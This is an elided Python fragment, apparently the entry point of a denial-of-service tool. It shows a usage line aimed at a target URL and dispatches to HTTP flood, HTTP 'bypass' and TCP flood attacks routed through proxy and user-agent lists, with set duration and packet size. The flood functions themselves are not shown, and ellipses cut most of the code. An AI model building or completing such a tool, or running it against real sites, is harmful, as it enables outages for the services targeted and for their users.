...
def main():
    ...
    print("Example use: python main.py http://example.com --attack http_flood --duration 60 --packet-size 128")
    ...
    if args.attack == "http_flood":
        http_flood_attack(args.target, proxies, user_agents, args.duration, args.packet_size)
    elif args.attack == "http_bypass":
        http_bypass_attack(args.target, proxies, user_agents, args.duration, args.packet_size)
    elif args.attack == "tcp_flood":
        tcp_flood_attack(args.target, proxies, args.duration, args.packet_size)
